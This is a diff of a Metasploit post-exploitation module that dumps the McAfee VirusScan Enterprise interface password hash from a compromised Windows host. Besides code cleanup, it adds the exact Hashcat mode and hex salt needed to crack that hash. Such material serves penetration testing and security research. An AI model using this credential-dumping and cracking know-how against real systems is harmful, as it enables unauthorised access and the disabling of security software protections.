@@ -1,11 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
@@ -20,8 +18,11 @@ class Metasploit3 < Msf::Post
       info,
       'Name'          => 'McAfee Virus Scan Enterprise Password Hashes Dump',
       'Description'   => %q(
-        This module extracts the password hash from McAfee Virus Scan
-        Enterprise (VSE) used to lock down the user interface.
+        This module extracts the password hash from McAfee Virus Scan Enterprise (VSE)
+        used to lock down the user interface. Hashcat supports cracking this type of
+        hash using hash type sha1($salt.unicode($pass)) (-m 140) and a hex salt
+        (--hex-salt) of 01000f000d003300 (unicode "\x01\x0f\x0d\x33"). A dynamic
+        format is available for John the Ripper at the referenced URL.
       ),
       'License'       => MSF_LICENSE,
       'Author'        => [
@@ -117,7 +118,7 @@ class Metasploit3 < Msf::Post
 
       # Store McAfee password hash as loot
       loot_path = store_loot('mcafee.hash', 'text/plain', session, "mcafee:#{hash}", 'mcafee_hashdump.txt', 'McAfee Password Hash')
-      print_status("McAfee VSE password hash saved in: #{loot_path}")
+      print_good("McAfee VSE password hash saved in: #{loot_path}")
     end
   end
 end
